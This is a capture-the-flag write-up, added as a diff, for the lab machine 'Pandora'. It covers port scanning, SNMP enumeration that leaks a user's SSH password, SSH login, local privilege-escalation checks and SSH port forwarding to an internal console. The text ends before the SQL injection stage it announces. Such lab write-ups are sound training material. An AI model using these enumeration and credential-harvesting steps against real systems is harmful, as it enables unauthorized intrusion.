@@ -1,0 +1,2387 @@
+---
+Primary_category: "[[EASY]]"
+title: "PANDORA"
+draft: false
+banner: "https://images.unsplash.com/photo-1589763472885-46dd5b282f52?q=80&w=1748&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"
+banner_y: 0.88286
+tags: 
+cssclasses:
+---
+
+###### PRIMARY CATEGORY → [[EASY]]
+
+#### Summary
+
+- ***Summary A***
+- ***Summary B***
+- ***Summary C***
+- ***Summary D***
+- ***Summary E***
+
+![[PANDORA-20250308172536359.webp|400]]
+
+---
+
+#### Setup
+
+Directory creation with the Machine's Name
+
+```bash
+mkdir Pandora && cd !$
+```
+
+Creation of a *Pentesting Folder Structure* to store all the information related to the target
+
+> ***[[ZSH CUSTOM FUNCTIONS#mkt|Reference]]***
+
+```bash
+mkt
+```
+
+> [!IMPORTANT]- *Tree*
+>
+> ```bash
+> .
+> ├── evidence
+> │   ├── creds
+> │   ├── data
+> │   └── screenshots
+> ├── logs
+> ├── scans
+> ├── scope
+> └── tools
+> ```
+>
+
+---
+
+#### Recon
+
+##### *OS Identification*
+
+First, proceed to identify the *Target Operative System*. This can be done by a simple `ping` taking into account the *TTL Unit*
+
+The standard values are →
+
+- ***About 64 → Linux***
+- ***About 128 → Windows***
+
+```bash
+ping -c1 10.129.49.184
+```
+
+> [!NOTE]- *Command Output*
+>
+> ```bash
+> PING 10.129.49.184 (10.129.49.184) 56(84) bytes of data.
+> 64 bytes from 10.129.49.184: icmp_seq=1 ttl=63 time=41.2 ms
+> 
+> --- 10.129.49.184 ping statistics ---
+> 1 packets transmitted, 1 received, 0% packet loss, time 0ms
+> rtt min/avg/max/mdev = 41.213/41.213/41.213/0.000 ms
+> ```
+>
+
+As mentioned, according to the TTL, It seems that It is a ***Linux Target***
+
+##### *Port Scanning*
+
+###### *General Scan*
+
+Let's run a *Nmap* Scan to check what *TCP* Ports are opened in the machine
+
+The Scan result is exported in a grepable format for subsequent *Port Parsing*
+
+```bash
+nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn --disable-arp-ping -oG allTCPPorts 10.129.49.184
+```
+
+> [!BUG]- *AllTCPPorts*
+>
+> ```bash
+> # Nmap 7.94SVN scan initiated Wed Mar  5 19:31:41 2025 as: nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn --disable-arp-ping -oG allTCPPorts 10.129.49.184
+> # Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
+> Host: 10.129.49.184 ()	Status: Up
+> Host: 10.129.49.184 ()	Ports: 22/open/tcp//ssh///, 80/open/tcp//http///
+> # Nmap done at Wed Mar  5 19:31:53 2025 -- 1 IP address (1 host up) scanned in 11.95 seconds
+> ```
+>
+
+**Open TCP Ports → 22 and 80**
+
+###### *Comprehensive Scan*
+
+The *[[ZSH CUSTOM FUNCTIONS#extractPorts|ExtractPorts]]* utility is used to get a **Readable Summary** of the previous scan and have ***all Open Ports copied to the clipboard***
+
+```bash
+extractPorts allTCPPorts
+```
+
+> [!BUG]- *ExtractPorts*
+>
+> ```bash
+> [+] Extracting information...
+> 
+>     [+] IP Address: 10.129.49.184
+>     [+] Open Ports: 22,80
+> 
+> [+] Ports Copied to Clipboard
+> ```
+>
+
+Then, the ***Comprehensive Scan*** is performed to gather the ***Service and Version*** running on each open port and launch a set of ***Nmap Basic Recon Scripts***
+
+Note that this scan is also exported to have evidence at hand
+
+```bash
+nmap -p22,80 -sCV -n -Pn --disable-arp-ping -oN targeted 10.129.49.184
+```
+
+> [!BUG]- *Targeted*
+>
+> ```bash
+> # Nmap 7.94SVN scan initiated Wed Mar  5 19:35:09 2025 as: nmap -p22,80 -sCV -n -Pn --disable-arp-ping -oN targeted 10.129.49.184
+> Nmap scan report for 10.129.49.184
+> Host is up (0.053s latency).
+> 
+> PORT   STATE SERVICE VERSION
+> 22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+> | ssh-hostkey: 
+> |   3072 24:c2:95:a5:c3:0b:3f:f3:17:3c:68:d7:af:2b:53:38 (RSA)
+> |   256 b1:41:77:99:46:9a:6c:5d:d2:98:2f:c0:32:9a:ce:03 (ECDSA)
+> |_  256 e7:36:43:3b:a9:47:8a:19:01:58:b2:bc:89:f6:51:08 (ED25519)
+> 80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+> |_http-title: Play | Landing
+> |_http-server-header: Apache/2.4.41 (Ubuntu)
+> Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+> 
+> Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+> # Nmap done at Wed Mar  5 19:35:20 2025 -- 1 IP address (1 host up) scanned in 10.12 seconds
+> ```
+>
+
+##### *OS Version (Codename)*
+
+In *Linux Systems*, the *Operative System Version* could be extracted through *Launchpad*
+
+According to the **Version Column Data** of the [[#Comprehensive Scan]], proceed as follows →
+
+- ***22 - SSH***
+
+> ***[Reference](https://launchpad.net/ubuntu/+source/openssh/1:8.2p1-4ubuntu0.3)***
+
+```bash
+OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 site:launchpad.net
+```
+
+- ***80 - HTTP***
+
+> ***[Reference](https://launchpad.net/ubuntu/+source/apache2/2.4.41-4ubuntu3.10)***
+
+```bash
+Apache httpd 2.4.41 site:launchpad.net
+```
+
+***Codename → [Ubuntu Focal](https://releases.ubuntu.com/focal/)***
+
+This can be verified once the [[SHELL SCRIPTING|shell]] is obtained, i.e. the system has been compromised
+
+There are several ways to carry out it →
+
+```bash
+cat /etc/os-release
+```
+
+```bash
+hostnamectl # If System has been booted via Systemd
+```
+
+```bash
+lsb_release -a
+```
+
+```bash
+cat /etc/issue
+```
+
+```bash
+cat /proc/version
+```
+
+##### *22 - SSH*
+
+***OpenSSH Version → v8.2***
+
+###### *Banner Grabbing*
+
+The Version of the Service running can also be obtained via *Banner Grabbing* as follows →
+
+```bash
+nc -v 10.129.49.184 22 <<< ""
+```
+
+> [!NOTE]- *Command Output*
+>
+> ```bash
+> SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.3
+> Invalid SSH identification string.
+> ```
+>
+
+###### *CVE-2018-15473*
+
+All the *OpenSSH* Versions prior to the *v7.7* one are vulnerable to a **System User Enumeration**
+
+> ***[Reference](https://nvd.nist.gov/vuln/detail/cve-2018-15473)***
+
+**CVE-2018-15473** → ***OpenSSH < v7.7***
+
+This time it does not apply since the *OpenSSH* is the *v8.2*
+
+##### *80 - HTTP*
+
+This in the only port with a service associated that we can list correctly, so let'go!
+
+###### *Banner Grabbing*
+
+We can start sending a simple *HTTP Request* to the *Web Server* to grab the *HTTP Response Headers* and see if any interesting information is leaked apart of the *Apache Version*, which we already know from the [[#*Comprehensive Scan*|Nmap Comprehensive Scan]]
+
+```bash
+curl --silent --request GET --location --head "http://10.129.142.21"
+```
+
+> [!NOTE]- *Command Output*
+> 
+> ```bash
+> HTTP/1.1 200 OK
+> Date: Thu, 06 Mar 2025 14:17:17 GMT
+> Server: Apache/2.4.41 (Ubuntu)
+> Last-Modified: Fri, 03 Dec 2021 14:00:31 GMT
+> ETag: "8318-5d23e548bc656"
+> Accept-Ranges: bytes
+> Content-Length: 33560
+> Vary: Accept-Encoding
+> Content-Type: text/html
+> 
+> ```
+>
+
+But there is nothing interesting
+
+###### *Web Technologies*
+
+Now, let's use `whatweb` to list the *Web Technologies* that are running behind the web such as the *CMS*, if any, or the *Server-Side Language Programming*
+
+```bash
+whatweb http://10.129.142.21
+```
+
+> [!NOTE]- *Command Output*
+>
+> ```bash
+> http://10.129.142.21 [200 OK] Apache[2.4.41], Bootstrap, Country[RESERVED][ZZ], Email[contact@panda.htb,example@yourmail.com,support@panda.htb], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.129.142.21], Open-Graph-Protocol[website], Script, Title[Play | Landing], probably WordPress, X-UA-Compatible[IE=edge]
+> ```
+>
+
+From there we extract several interesting things
+
+We see two possible domains where *Virtual Hosting* can be applied
+
+On the other hand, we have that the *Web* is probably using *Open-Graph* and that the *CMS* could be *WordPress*
+
+###### *Browser-Based Inspection*
+
+From the browser, if we access the *Web Page*, we receive the following content rendered in the *HTTP Responde* from the *Web Server*
+
+![[PANDORA-20250306152745229.webp|450]]
+
+First, we can check the *Wappalyzer Addon* to see if it extracts any additional information beyond what is listed by *whatweb*
+
+![[PANDORA-20250306152914621.webp|250]]
+
+It looks like the site is running *PHP*, but we do not see the *WordPress* leakage here
+
+if we request an *index.php*, we get an *HTTP 404 error*
+
+![[PANDORA-20250306153206974.webp|450]]
+
+But if we request an *index.html*, we get the previous page, which makes me think that this is a *static website*, at least the *home page*
+
+It could be a directory inside the *Document Root* that contains a *CMS* such as *WordPress*, *Prestashop*, *Joomla*...
+
+We don't get anything by checking the *source code* of the home page, no juicy comments in the *HTML code* or anything similar
+
+If we inspect the entire *homepage*, all the links that appear on it do not redirect anywhere, It is literally all *static content*
+
+The only interesting thing is the *contact form*
+
+![[PANDORA-20250306154630998.webp|450]]
+
+Hitting the submit button redirects to the start of the *homepage*
+
+We can check with *Burpsuite* if any data is sent, but it is not
+
+###### *Directory and File Listing*
+
+So, let's perform a *directory listing* on the *http://10.129.142.21 URL* to check if there are any directories
+
+To carry out this task, we can use `gobuster`
+
+```bash
+gobuster dir --add-slash --threads 200 --output webScan.gobuster --wordlist /usr/share/seclist/Discovery/Web-Content/directory-list-2.3-medium.txt --url http://10.129.142.21
+```
+
+> [!NOTE]- *Command Output*
+>
+> ```bash
+> Gobuster v3.6
+> by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+> [+] Url:                     http://10.129.142.21
+> [+] Method:                  GET
+> [+] Threads:                 200
+> [+] Wordlist:                /usr/share/seclist/Discovery/Web-Content/directory-list-2.3-medium.txt
+> [+] Negative Status codes:   404
+> [+] User Agent:              gobuster/3.6
+> [+] Add Slash:               true
+> [+] Timeout:                 10s
+> Starting gobuster in directory enumeration mode
+> /assets/              (Status: 200) [Size: 1692]
+> /icons/               (Status: 403) [Size: 278]
+> /server-status/       (Status: 403) [Size: 278]
+> Progress: 220545 / 220546 (100.00%)
+> Finished
+> ```
+>
+
+Nothing interesting again, we can try to list some *HTLM* files
+
+```bash
+gobuster dir --threads 200 --output webScan.gobuster --extensions html --wordlist /usr/share/seclist/Discovery/Web-Content/directory-list-2.3-medium.txt --url http://10.129.142.21
+```
+
+> [!NOTE]- *Command Output*
+>
+> ```bash
+> ```
+>
+
+But there is no *html* file apart from the *index.html*
+
+###### *Virtual Hosts Enumeration*
+
+We can again use *gobuster* to list the *Virtual Hosts* configured on the *Apache Web Server*
+
+Earlier we saw a domain in the *whatweb* output → `panda.htb`
+
+Let's add this domain to the `/etc/hosts` file and check if the *Web Server* offers other content for that *domain*
+
+```bash
+printf "\n10.129.142.21\tpanda.htb" >> /etc/hosts
+```
+
+> [!BUG]- */etc/hosts*
+>
+> ```bash
+> # Host addresses
+> 127.0.0.1  localhost
+> 127.0.1.1  parrot
+> ::1        localhost ip6-localhost ip6-loopback
+> ff02::1    ip6-allnodes
+> ff02::2    ip6-allrouters
+> # Others
+> 10.129.142.21   panda.htb
+> ```
+>
+
+From the browser, enter the following url → `http://panda.htb`
+
+But we get the same content as from `http://10.129.142.21`
+
+So, as mentioned before, use *gobuster* to list any valid *Virtual Hosts* for the *panda.htb* domain
+
+```bash
+gobuster vhost --domain panda.htb --append-domain --threads 200 --output vhostScan.gobuster --wordlist /usr/share/seclist/Discovery/DNS/subdomains-top1million-110000.txt --url http://10.129.142.21
+```
+
+> [!NOTE]- *Command Output*
+>
+> ```bash
+> Gobuster v3.6
+> by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+> [+] Url:             http://10.129.142.21
+> [+] Method:          GET
+> [+] Threads:         100
+> [+] Wordlist:        /usr/share/seclist/Discovery/DNS/subdomains-top1million-110000.txt
+> [+] User Agent:      gobuster/3.6
+> [+] Timeout:         10s
+> [+] Append Domain:   true
+> Starting gobuster in VHOST enumeration mode
+> Progress: 114441 / 114442 (100.00%)
+> Finished
+> ```
+>
+
+We get nothing either...
+
+At this point, since there is only one port open, corresponding to the *HTTP Server*, before continuing with more in-depth enumeration, let's check if there is any *UDP* ports open on the *target* as we only have listed the *TCP* ports before
+
+#####  *Port Scanning*
+
+###### *General UDP Scan*
+
+As we did with the *TCP Scan*, let's check what *UDP* ports are open in the *machine* as follows
+
+```bash
+nmap --top-port 20 --open -sU -T5 -vvv -n -Pn --disable-arp-ping -oG allUDPPorts 10.129.142.21
+```
+
+> [!BUG]- *AllUDPPorts*
+>
+> ```bash
+> # Nmap 7.94SVN scan initiated Thu Mar  6 16:22:14 2025 as: nmap --top-port 20 --open -sU -T5 -vvv -n -Pn --disable-arp-ping -oG allUDPPorts 10.129.142.21
+> # Ports scanned: TCP(0;) UDP(20;53,67-69,123,135,137-139,161-162,445,500,514,520,631,1434,1900,4500,49152) SCTP(0;) PROTOCOLS(0;)
+> Host: 10.129.142.21 ()	Status: Up
+> Host: 10.129.142.21 ()	Ports: 53/open|filtered/udp//domain///, 68/open|filtered/udp//dhcpc///, 69/open|filtered/udp//tftp///, 135/open|filtered/udp//msrpc///, 137/open|filtered/udp//netbios-ns///, 161/open/udp//snmp///, 162/open|filtered/udp//snmptrap///, 445/open|filtered/udp//microsoft-ds///, 514/open|filtered/udp//syslog///, 631/open|filtered/udp//ipp///, 1434/open|filtered/udp//ms-sql-m///, 1900/open|filtered/udp//upnp///, 4500/open|filtered/udp//nat-t-ike///, 49152/open|filtered/udp/////	Ignored State: closed (6)
+> # Nmap done at Thu Mar  6 16:22:18 2025 -- 1 IP address (1 host up) scanned in 3.68 seconds
+> ```
+>
+
+***Open UDP Ports → 161***
+
+###### *Comprehensive Scan*
+
+And the *SNMP* port is open on the *remote machine*
+
+Therefore, we can list the version of this service and run a bunch of *default Nmap Scripts* to gather some additional information about the service running on *port 161*
+
+```bash
+nmap -p161 -sU -sCV -n -Pn --disable-arp-ping -oN targeted.snmp 10.129.142.21
+```
+
+> [!NOTE]- *Command Output*
+>
+> ```bash
+> # Nmap 7.94SVN scan initiated Thu Mar  6 16:52:58 2025 as: nmap -p161 -sU -sCV -n -Pn --disable-arp-ping -oN targeted.snmp 10.129.142.21
+> Nmap scan report for 10.129.142.21
+> Host is up (0.044s latency).
+> 
+> PORT    STATE SERVICE VERSION
+> 161/udp open  snmp    SNMPv1 server; net-snmp SNMPv3 server (public)
+> | snmp-info: 
+> |   enterprise: net-snmp
+> |   engineIDFormat: unknown
+> |   engineIDData: 48fa95537765c36000000000
+> |   snmpEngineBoots: 31
+> |_  snmpEngineTime: 1h40m34s
+> | snmp-interfaces: 
+> |   lo
+> |     IP address: 127.0.0.1  Netmask: 255.0.0.0
+> |     Type: softwareLoopback  Speed: 10 Mbps
+> |     Traffic stats: 905.50 Kb sent, 905.50 Kb received
+> |   VMware VMXNET3 Ethernet Controller
+> |     IP address: 10.129.142.21  Netmask: 255.255.0.0
+> |     MAC address: 00:50:56:94:18:65 (VMware)
+> |     Type: ethernetCsmacd  Speed: 4 Gbps
+> |_    Traffic stats: 1.07 Gb sent, 147.79 Mb received
+> | snmp-sysdescr: Linux pandora 5.4.0-91-generic #102-Ubuntu SMP Fri Nov 5 16:31:28 UTC 2021 x86_64
+> |_  System uptime: 1h40m33.93s (603393 timeticks)
+> |
+> |_  Service Info: Host: pandora
+> |_
+> |_  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+> # Nmap done at Thu Mar  6 16:57:08 2025 -- 1 IP address (1 host up) scanned in 249.99 seconds
+> ```
+>
+
+##### *161 - SNMP*
+
+First, we get that the *SNMP* version on the *remote machine* is the *2c*, which means that the *authentication* is handled using *community strings*
+
+Note that the *Nmap* scan gave us the valid *community string* → ***Public***
+
+We can verify it using `snmpwalk` to request information about the availables *OIDs* in the *target*
+
+```bash
+snmpwalk -v 2c -c public 10.129.142.21 .
+```
+
+With the above command, we start getting a lot of information related to the different *OIDs* and its values
+
+Therefore, we can assume that the above *community string* is a valid one
+
+However, if we had not obtained the *community string* from *Nmap*, we could obtain it through `onesixtyone`
+
+We can pass a list of *community strings* to this tool and it will try to obtain a valid one by authenticating to the *SNMP Server* for each line in the wordlist
+
+```bash
+onesixtyone -c /usr/share/seclist/Discovery/SNMP/common-snmp-community-strings.txt 10.129.142.21
+```
+
+> [!NOTE]- *Command Output*
+>
+> ```bash
+> Scanning 1 hosts, 120 communities
+> 10.129.142.21 [public] Linux pandora 5.4.0-91-generic #102-Ubuntu SMP Fri Nov 5 16:31:28 UTC 2021 x86_64
+> 10.129.142.21 [public] Linux pandora 5.4.0-91-generic #102-Ubuntu SMP Fri Nov 5 16:31:28 UTC 2021 x86_64
+> ```
+> 
+
+And we again verify that ***public*** is a valid *community string*
+
+So, since *SNMPv2c* supports the *GETBULK* command, we can list all the *OIDs' values* using `snmpbulkwalk`, instead of `snmpwalk`, and dump the output to a file to review it in-depth later
+
+```bash
+snmpbulkwalk -v 2c -c public 10.129.142.21 | tee data.snmp
+```
+
+After the dump with *SNMP* has finished, let's check if there is some juicy information on it
+
+> [!INFO]-
+>
+> Note that, during an *SNMP dump*, some juicy information can be leaked, as it contains data such as the processes running on the system
+>
+> Normally, along with the *PID*, there is a column called *CMD* or *Command* that lists the *binary* and the *arguments* passed to it that created the process
+>
+
+Reviewing that *snmp.data* file, we found the following information in the *OIDs* values related to the *system processes* running on the *target*
+
+```bash
+<SNIP>
+HOST-RESOURCES-MIB::hrSWRunParameters.943 = STRING: "-f"
+HOST-RESOURCES-MIB::hrSWRunParameters.944 = STRING: "-LOw -u Debian-snmp -g Debian-snmp -I -smux mteTrigger mteTriggerConf -f -p /run/snmpd.pid"
+HOST-RESOURCES-MIB::hrSWRunParameters.963 = STRING: "-c sleep 30; /bin/bash -c '/usr/bin/host_check -u daniel -p HotelBabylon23'"
+HOST-RESOURCES-MIB::hrSWRunParameters.969 = ""
+HOST-RESOURCES-MIB::hrSWRunParameters.997 = STRING: "-o -p -- \\u --noclear tty1 linux"
+HOST-RESOURCES-MIB::hrSWRunParameters.1040 = ""
+HOST-RESOURCES-MIB::hrSWRunParameters.1041 = STRING: "-k start"
+HOST-RESOURCES-MIB::hrSWRunParameters.1130 = STRING: "-u daniel -p HotelBabylon23"
+HOST-RESOURCES-MIB::hrSWRunParameters.4338 = STRING: "-k start"
+<SNIP>
+```
+
+It looks that the above sessions is related to the *OIDs* values that list the arguments section of the *processe's cmdline*
+
+And we see there a binary named `/usr/bin/host_check` and its arguments, which are a *username*  and a *password*
+
+- ***Username → Daniel***
+
+- ***Password → HotelBabylon23***
+
+---
+
+#### Shell as System User via SSH
+
+Since we did not see any *login* or *admin* panel in the *website*, let's check if these credentials are valid to connect to the *target* via *SSH*
+
+```bash
+ssh -p22 daniel@10.129.142.21
+```
+
+> [!NOTE]- *Command Output*
+>
+> ```bash
+> daniel@10.129.142.21's password: 
+> Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)
+> 
+>  * Documentation:  https://help.ubuntu.com
+>  * Management:     https://landscape.canonical.com
+>  * Support:        https://ubuntu.com/advantage
+> 
+>   System information as of Thu  6 Mar 16:26:22 UTC 2025
+> 
+>   System load:           0.0
+>   Usage of /:            64.5% of 4.87GB
+>   Memory usage:          10%
+>   Swap usage:            0%
+>   Processes:             227
+>   Users logged in:       0
+>   IPv4 address for eth0: 10.129.142.21
+>   IPv6 address for eth0: dead:beef::250:56ff:fe94:1865
+> 
+>   => /boot is using 91.8% of 219MB
+> 
+> 
+> 0 updates can be applied immediately.
+> 
+> 
+> The list of available updates is more than a week old.
+> To check for new updates run: sudo apt update
+> 
+> 
+> The programs included with the Ubuntu system are free software;
+> the exact distribution terms for each program are described in the
+> individual files in /usr/share/doc/*/copyright.
+> 
+> Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+> applicable law.
+> 
+> daniel@pandora:~$ 
+> ```
+>
+
+And we are in!
+
+Since we are not able to clean the screen using `C-l`, let's deal with this problem as follows
+
+```bash
+export TERM=xterm-256color
+export SHELL=/bin/bash
+. /etc/skel/.bashrc
+```
+
+---
+
+#### Privesc #1
+
+***Initial Non-Privileged User → Daniel***
+
+##### *Unauthenticated SQL Injection + RCE*
+
+> ***Unauthenticated SQL Injection to bypass the Pandora Login Panel leads to Remote Command Execution through the Upload of a Malicious Extension***
+
+Well, once inside the machine, we have to find a way to pivot to another user with more privileges than the current one, or at least with more dangerous *privesc vectors*
+
+###### *User's Groups*
+
+First, let's check which groups the user *daniel* belongs to →
+
+```bash
+id
+```
+
+> [!NOTE]- *Command Output*
+>
+> ```bash
+> uid=1001(daniel) gid=1001(daniel) groups=1001(daniel)
+> ```
+>
+
+There are no groups that could rise to a possible *privesc vector*
+
+###### *Sudoers Permissions*
+
+We can check if the user has any *sudoers* permissions to execute any *command* as any specific *user* on the *target*
+
+```bash
+sudo -l
+```
+
+> [!NOTE]- *Command Output*
+>
+> ```bash
+> [sudo] password for daniel: 
+> Sorry, user daniel may not run sudo on pandora.
+> ```
+>
+
+There is nothing here either
+
+###### *Setuid Binaries*
+
+Let's check the *system binaries* with the *SUID* permission flag set
+
+```bash
+find  / -perm -4000 -type f -ls 2> /dev/null
+```
+
+> [!NOTE]- *Command Output*
+>
+> ```bash
+> 264644    164 -rwsr-xr-x   1 root     root       166056 Jan 19  2021 /usr/bin/sudo
+> 265010     32 -rwsr-xr-x   1 root     root        31032 May 26  2021 /usr/bin/pkexec
+> 267386     84 -rwsr-xr-x   1 root     root        85064 Jul 14  2021 /usr/bin/chfn
+> 262764     44 -rwsr-xr-x   1 root     root        44784 Jul 14  2021 /usr/bin/newgrp
+> 267389     88 -rwsr-xr-x   1 root     root        88464 Jul 14  2021 /usr/bin/gpasswd
+> 264713     40 -rwsr-xr-x   1 root     root        39144 Jul 21  2020 /usr/bin/umount
+> 262929     20 -rwsr-x---   1 root     matt        16816 Dec  3  2021 /usr/bin/pandora_backup
+> 267390     68 -rwsr-xr-x   1 root     root        68208 Jul 14  2021 /usr/bin/passwd
+> 264371     56 -rwsr-xr-x   1 root     root        55528 Jul 21  2020 /usr/bin/mount
+> 264643     68 -rwsr-xr-x   1 root     root        67816 Jul 21  2020 /usr/bin/su
+> 264040     56 -rwsr-sr-x   1 daemon   daemon      55560 Nov 12  2018 /usr/bin/at
+> 264219     40 -rwsr-xr-x   1 root     root        39144 Mar  7  2020 /usr/bin/fusermount
+> 267387     52 -rwsr-xr-x   1 root     root        53040 Jul 14  2021 /usr/bin/chsh
+> 262815    464 -rwsr-xr-x   1 root     root       473576 Jul 23  2021 /usr/lib/openssh/ssh-keysign
+> 264920     52 -rwsr-xr--   1 root     messagebus    51344 Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+> 264927     16 -rwsr-xr-x   1 root     root          14488 Jul  8  2019 /usr/lib/eject/dmcrypt-get-device
+> 266611     24 -rwsr-xr-x   1 root     root          22840 May 26  2021 /usr/lib/policykit-1/polkit-agent-helper-1
+> ```
+>
+
+And there is one that stands out from the rest → `/usr/bin/pandora_backup`
+
+But, note that *Others* has no permissions on that file and, since the *user* and *group owner* are *root* and *matt* respectively, we cannot do anything until we become *matt*
+
+###### *Binaries's Capabilities*
+
+We can check if any *binary* in the system has any *sensible capability* assigned to it
+
+```bash
+getcap -r / 2> /dev/null
+```
+
+> [!NOTE]- *Command Output*
+>
+> ```bash
+> /usr/bin/traceroute6.iputils = cap_net_raw+ep
+> /usr/bin/ping = cap_net_raw+ep
+> /usr/bin/mtr-packet = cap_net_raw+ep
+> /usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
+> ```
+>
+
+But they don't have it
+
+###### *Home Directories*
+
+We check the `/home` directory to see the directories it has
+
+```bash
+ls /home
+```
+
+> [!NOTE]- *Command Output*
+>
+> ```bash
+> total 8
+> drwxr-xr-x 4 daniel daniel 4096 Mar  6 16:26 daniel
+> drwxr-xr-x 2 matt   matt   4096 Dec  7  2021 matt
+> ```
+>
+
+Note that, apart from our *home* directory, we can access to the *matt''s home* directory
+
+We can run a `find` command with the `-ls`  options to list the existent directories and files inside those *system user folders* and their permissions
+
+```bash
+find . -ls
+```
+
+> [!NOTE]- *Command Output*
+>
+> ```bash
+> 20      4 drwxr-xr-x   4 root     root         4096 Dec  7  2021 .
+> 18172      4 drwxr-xr-x   4 daniel   daniel       4096 Mar  6 16:26 ./daniel
+> 5118      0 lrwxrwxrwx   1 daniel   daniel          9 Jun 11  2021 ./daniel/.bash_history -> /dev/null
+> 18127      4 -rw-r--r--   1 daniel   daniel        220 Feb 25  2020 ./daniel/.bash_logout
+> 18128      4 -rw-r--r--   1 daniel   daniel        807 Feb 25  2020 ./daniel/.profile
+> 156480      4 drwx------   2 daniel   daniel       4096 Mar  6 16:26 ./daniel/.cache
+> 156481      0 -rw-r--r--   1 daniel   daniel          0 Mar  6 16:26 ./daniel/.cache/motd.legal-displayed
+> 18319      4 drwx------   2 daniel   daniel       4096 Dec  7  2021 ./daniel/.ssh
+> 18321      4 -rw-------   1 daniel   daniel          1 Dec  7  2021 ./daniel/.ssh/authorized_keys
+> 18129      4 -rw-r--r--   1 daniel   daniel       3771 Feb 25  2020 ./daniel/.bashrc
+> 8287      4 drwxr-xr-x   2 matt     matt         4096 Dec  7  2021 ./matt
+> 5113      0 lrwxrwxrwx   1 matt     matt            9 Jun 11  2021 ./matt/.bash_history -> /dev/null
+> 8288      4 -rw-r--r--   1 matt     matt          220 Feb 25  2020 ./matt/.bash_logout
+> 8289      4 -rw-r--r--   1 matt     matt          807 Feb 25  2020 ./matt/.profile
+> 1918      4 -rw-r-----   1 root     matt           33 Mar  6 14:13 ./matt/user.txt
+> 8290      4 -rw-r--r--   1 matt     matt         3771 Feb 25  2020 ./matt/.bashrc
+> ```
+>
+
+There are no sensitive or unsual file in the above list. The only ones that could contain sensitive information would be *.bash_history* ones, but they point to the `/dev/null` 
+
+And now we know that the *user.txt* flag is in the *matt's home directory*
+
+###### *Internal Open Ports*
+
+Let's check if there are any services listening on a specific port only for the *localhost* interface or something similar
+
+```bash
+lsof -Pn -i 4TCP -s TCP:listen
+```
+
+We get no output using `lsof`, proceed with `ss` or `netstat`
+
+```bash
+ss -nltp
+```
+
+> [!NOTE]- *Command Output*
+>
+> ```bash
+> State                         Recv-Q                        Send-Q                                               Local Address:Port                                               Peer Address:Port                       Process                       
+> LISTEN                        0                             4096                                                 127.0.0.53%lo:53                                                      0.0.0.0:*                                                        
+> LISTEN                        0                             128                                                        0.0.0.0:22                                                      0.0.0.0:*                                                        
+> LISTEN                        0                             80                                                       127.0.0.1:3306                                                    0.0.0.0:*                                                        
+> LISTEN                        0                             128                                                           [::]:22                                                         [::]:*                                                        
+> LISTEN                        0                             511                                                              *:80                                                            *:*  
+> ```
+>
+
+Only the following ports are listening locally → ***3306 (MySQL) and 53 (Bind DNS)***
+
+The rest of the ports are listening on all the network interfaces and are externally accessible, so we did not find anything interesting here either
+
+###### *Apache Configuration Files for Virtual Hosts*
+
+It may be a *Virtual Host* configured which is listening on *localhost:80* and, therefore, it is not accessible externally
+
+```bash
+ls -l /etc/apache2/sites-enabled/
+```
+
+> [!NOTE]- *Command Output*
+>
+> ```bash
+> total 0
+> lrwxrwxrwx 1 root root 35 Dec  3  2021 000-default.conf -> ../sites-available/000-default.conf
+> lrwxrwxrwx 1 root root 31 Dec  3  2021 pandora.conf -> ../sites-available/pandora.conf
+> ```
+>
+
+And there is a `pandora.conf` file which looks interesting, let's examine its content
+
+```bash
+cat /etc/apache2/sites-enabled/pandora.conf
+```
+
+> [!BUG]- *Pandora.conf*
+>
+> ```bash
+> <VirtualHost localhost:80>
+>   ServerAdmin admin@panda.htb
+>   ServerName pandora.panda.htb
+>   DocumentRoot /var/www/pandora
+>   AssignUserID matt matt
+>   <Directory /var/www/pandora>
+>     AllowOverride All
+>   </Directory>
+>   ErrorLog /var/log/apache2/error.log
+>   CustomLog /var/log/apache2/access.log combined
+> </VirtualHost>
+> ```
+>
+
+This *Virtual Host* is configured to listen locally on *port 80*. Therefore, it is not accesible externally
+
+The file name says it all, but let's check what *Webservice or Framework* is running on this port on the localhost
+
+```bash
+curl --silent --location --request GET 'http://localhost'
+```
+
+> [!NOTE]- *Command Output*
+>
+> ```bash
+> <meta HTTP-EQUIV="REFRESH" content="0; url=/pandora_console/">
+> ```
+>
+
+It seems that the above output indicates to add to the previous *URL* the following path → `/pandora/console`
+
+```bash
+curl --silent --location --request GET 'http://localhost/pandora_console'
+```
+
+And we receive content in the *HTTP Response body*
+
+###### *SSH Local Port Forwarding*
+
+So, let's apply a *local port forwarding* from our *machine* using *SSH* to be able to access this *webpage* from our machine's browser
+
+```bash
+ssh -p22 -fN -L 80:localhost:80 daniel@10.129.47.86
+```
+
+This command sets up a local listening socket on *port 80* of our machine,. Any traffic sent to this port is forwarded through the *SSH* connection to *port 80* of *localhost* on the *target*
+
+This allows us to access the web page hosted on the *remote machine* as if it were running locally
+
+We can check that *port 80* is being used by the *SSH* process as follows →
+
+```bash
+lsof -Pn -i:80 -s TCP:listen
+```
+
+> [!NOTE]- *Command Output*
+>
+> ```bash
+> COMMAND   PID USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
+> ssh     20161 root    4u  IPv6  70916      0t0  TCP [::1]:80 (LISTEN)
+> ssh     20161 root    5u  IPv4  70917      0t0  TCP 127.0.0.1:80 (LISTEN)
+> ```
+>
+
